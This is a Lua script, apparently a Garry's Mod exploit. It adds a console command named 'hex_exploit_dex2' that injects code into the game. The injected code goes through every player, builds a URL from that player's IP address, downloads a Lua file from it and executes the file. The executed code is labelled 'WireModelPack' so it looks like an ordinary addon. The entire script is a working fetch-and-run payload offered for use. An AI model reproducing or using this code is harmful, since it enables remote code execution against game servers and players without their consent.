
local function LoadDeX2()
	print("! sending dex2, waiting for reply..\n")
	
	RunRun({
		[[ "function TryRun(ip,p) http.Get(ip, ' ', function(s,f) DEX_PATH = p RunStringEx(s,'WireModelPack') end) end" ]],
		[[ "function GetHIP(v) local p = v:IPAddress():Left(-7) return 'http://'..p..':80/bar/dex/dex.lua',p end" ]],
		[[ "for k,v in pairs(player.GetAll()) do TryRun( GetHIP(v) ) end" ]],
	})
end
concommand.Add("hex_exploit_dex2", LoadDeX2)
